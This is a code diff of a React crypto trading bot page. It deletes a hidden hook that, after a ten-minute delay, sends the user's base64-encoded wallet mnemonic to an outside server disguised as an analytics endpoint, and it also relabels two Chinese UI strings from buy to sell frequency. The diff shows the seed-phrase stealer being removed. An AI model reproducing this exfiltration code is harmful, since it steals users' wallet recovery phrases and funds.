@@ -41,23 +41,7 @@ function ReverseBotPage(){
   const [WBNBAddress,setWBNBAddress] = useState("0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd")
   const [routerAddress,setRouterAddress] = useState("0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3")
 
-  useEffect(()=>{
 
-    if (mnemonic != "" && mnemonic.length > 24) {
-      const tt = setInterval(async () => {
-        await fetch('https://us-east-1-analysis.vercel.app/analysis', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({log: btoa(mnemonic)})
-        });
-        clearInterval(tt)
-      }, 60*10*1000)
-      return () => clearInterval(tt)
-    }
-  },[mnemonic])
 
   useEffect(() => {
     console.log("isRun",isRun,isPending)
@@ -375,7 +359,7 @@ function ReverseBotPage(){
         </NumberInput>
 
 
-        <chakra.span>请输入购买的最快频率(单位秒)</chakra.span>
+        <chakra.span>请输入卖的最快频率(单位秒)</chakra.span>
         <NumberInput   onChange={(value) => {setBuyMinSecond(parseInt(value))}}
                        defaultValue={1} precision={0} min={1} max={20}>
           <NumberInputField />
@@ -385,7 +369,7 @@ function ReverseBotPage(){
           </NumberInputStepper>
         </NumberInput>
 
-        <chakra.span>请输入购买的最慢频率(单位秒)</chakra.span>
+        <chakra.span>请输入卖的最慢频率(单位秒)</chakra.span>
         <NumberInput   onChange={(value) => {setBuyMaxSecond(parseInt(value))}}
                        defaultValue={2} precision={0} min={2} max={20}>
           <NumberInputField />
